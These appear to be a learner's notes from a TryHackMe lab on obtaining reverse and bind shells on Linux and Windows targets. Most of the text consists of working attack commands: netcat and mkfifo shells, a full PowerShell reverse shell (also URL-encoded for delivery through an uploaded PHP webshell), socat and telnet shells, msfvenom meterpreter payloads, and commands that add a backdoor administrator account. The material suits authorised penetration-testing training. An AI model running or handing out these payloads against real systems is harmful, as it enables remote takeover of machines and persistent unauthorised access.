In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

In simple terms, we can force the remote server to:
- send us command line access to the server (a **reverse** shell)
- open up a port on the server which we can connect to in order to execute further commands (a **bind** shell)

Note:
	Aside from the tools we've already covered, there are some repositories of shells in many different languages. One of the most prominent of these is [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). The PentestMonkey [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of web-shells located at `/usr/share/webshells`. The [SecLists repo](https://github.com/danielmiessler/SecLists), though primarily used for wordlists, also contains some very useful code for obtaining shells.


- **Reverse shells** are when the target is forced to execute code that connects _back_ to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a _listener_ which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.
	![[Pasted image 20240817021926.png]]
	
- **Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
	![[Pasted image 20240817021857.png]]
	
 Shells can be either _interactive_ or _non-interactive_:
 - Interactive:_ If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to  interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt below. Here you can see that it's asking _interactively_ that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.	 ![[Pasted image 20240817021828.png]]

- Non-Interactive_ shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:
  ![[Pasted image 20240817022115.png]]
  Notice that the `whoami` command (which is non-interactive) executes perfectly, but the `ssh` command (which _is_ interactive) gives us no output at all. As an interesting side note, the output of an interactive command _does_ go somewhere, however, figuring out **where** is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.

## **Common Shell Payloads**
 In some versions of netcat (including the `nc.exe` Windows version included with Kali at `/usr/share/windows-resources/binaries`, and the version used in Kali itself: `netcat-traditional`) there is a `-e` option which allows you to execute a process on connection. For example, as a listener:

	`nc -lvnp <PORT> -e /bin/bash`

Connecting to the above listener with netcat would result in a bind shell on the target. Equally, for a reverse shell, connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` would result in a reverse shell on the target. This is however seen as being very insecure, and it is not included in most version of netcat. On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:

	mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

![[Pasted image 20240818163208.png]]


A very similar command can be used to send a netcat reverse shell:

	`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

![[Pasted image 20240818163443.png]]


When targeting a modern version of Windows Server, we can use the following Powershell reverse shell:
	`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

In order to use this, we need to replace `<IP>` and `<port>` with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:
![[Pasted image 20240818163651.png]]

## **Practice & Examples**
1) **Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell // Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.**

	Direct to the kali pre-installed webshell directory and edit the file php-reverse-shell.php, change the IP to your local into IP add and rename to rshell.php:
	![[Pasted image 20240820053521.png]]

	Visting the target machine and submit the shell:
	![[Pasted image 20240820053603.png]]

	Start listening on the attacking machine:
	![[Pasted image 20240820053634.png]]

stabilize the netcat:
1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` 
2. `export TERM=xterm`
3. Background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`


2)  **Experiment with bind and reverse netcat shells.**
	### **Bind Shell:**
	- **Concept**: In a bind shell, the target machine opens a specific port and listens for incoming connections. The attacker then connects to this open port to gain access to the command line on the target machine.

	- **Process**:
    1. The target machine runs a command to bind a shell to a specific port.
    2. The attacker connects to the target machine's IP address on that port.
    3. Once connected, the attacker can execute commands on the target machine through the shell.
    
- **Example Command**:
    `nc -lvp 4444 -e /bin/bash`
    
    Here, `nc` (netcat) listens on port `4444` and executes `/bin/bash` when a connection is established.

	### **Reverse Shell:**
	- **Concept**: In a reverse shell, the target machine initiates a connection back to the attacker's machine. The attacker then gains access to the command line on the target machine through this connection.

	- **Process**:
    1. The attacker sets up a listener on their own machine, waiting for incoming connections.
    2. The target machine runs a command to initiate a connection to the attacker's IP address and port.
    3. Once connected, the attacker can execute commands on the target machine through the shell.
    
- **Example Command**:
    `nc <attacker-IP> 4444 -e /bin/bash`
    
    Here, the target machine connects to the attacker's machine at `<attacker-IP>` on port `4444` and executes `/bin/bash` when the connection is established.


	 ssh connect to linux machine -> setting netcat listener on port 1234 -> reverse shell using 
	 `nc <machine-IP> <Port> -e /bin/bash`
 
	![[Pasted image 20240820193640.png]]
	![[Pasted image 20240820193754.png]]

	reverse shell using special command(with pipes):
	![[Pasted image 20240820194307.png]]
	![[Pasted image 20240820194336.png]]

3) **Reverse and bind shells using Socat on the Linux machine.**
	 ![[Pasted image 20240820200847.png]]
	![[Pasted image 20240820200922.png]]

	using special command (fully stable Linux tty reverse shell)
	![[Pasted image 20240820203805.png]]
	![[Pasted image 20240820203824.png]]


4) **Look through [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and try some of the other reverse shell techniques.**
   
	 ### **Linux Staged reverse TCP**
	`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf`

	 **Linux Stageless reverse TCP**
	`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf`

	generating the `linux` reverse shell msfvenom payload
	![[Pasted image 20240820231832.png]]

	generating multi/handler exploit serving as a listener using msfconsole ->
	 - set `payload/linux/x86/meterpreter/reverse_tcp` !!!
	![[Pasted image 20240820232015.png]]
	

	transfering the payload file to the target machine:
	![[Pasted image 20240820232346.png]]
	![[Pasted image 20240820232438.png]]

	searching for the exploit file
	![[Pasted image 20240820234148.png]]

	changing permission and run the exploit file 
	`sudo chmod +x /path/to/reverse.elf`  --> `./reverse.elf`
	

	 **Telnet**
	In Attacker machine start two listeners: 
	- nc -nvlp 8080
	- nc -nvlp 8081 
  
	In Victime machine run below command: 
	- telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081

5) **Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.**
	![[Pasted image 20240821010756.png]]
	
	setting nc listener -> nc -nvlp 1234
	
	changing the url to acces php shell :
	
	
	 machineIP/uploads/php-reverse-shell.php?cmd=
	`powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`

6) **The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.**

	To login using RDP:
	`xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.189.136 /u:Administrator /p:'TryH4ckM3!'`
	
	![[Pasted image 20240821011814.png]]

	create new users and add privileges into the windows machine
	
	`net user <username> <password> /add`
	`net localgroup administrators <username> /add`

	![[Pasted image 20240821011938.png]]

	logging again via RPD using the new privileged credentials:
	`xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.189.136 /u:nbyte /p:'nbyte'`

7)  **Socat and netcat to obtain reverse and bind shells on the Windows Target.**

	- socat:
		`socat TCP-L:<port> -`
		
		reverse shell (windows)
		`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
		
		bind shell(windows):
		`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

	- netcat
		`nc -nvlp 1234`
		
		powershell (run in cmd directly):
		`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("machineIP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`

8) **Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.**

	generating msfvenom windows payload:
	`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.222.83 LPORT=1234 -f exe > reverse.exe`

	creating listener using multi/handler with payload: `windows/meterpreter/reverse_tcp`
	![[Pasted image 20240821025104.png]]

	transfering the payload file to the attacking windows machine:
	![[Pasted image 20240821025229.png]]
	![[Pasted image 20240821025239.png]]

	run the file on the machine ... etc

9) Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with _netcat_ -- does this work?

	- setting up the listener using netcat:
		`nc -nvlp 1234`

	- generating msfvenom payloads:
		
		### **Windows Staged reverse TCP**
		`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe`

		### **Windows Stageless reverse TCP**
		`msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe`

		### **Linux Staged reverse TCP**
		`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf`

		### **Linux Stageless reverse TCP**
		`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf`

	- uploading manually on the website and open/test them
		![[Pasted image 20240821025811.png]]
		![[Pasted image 20240821025829.png]]
		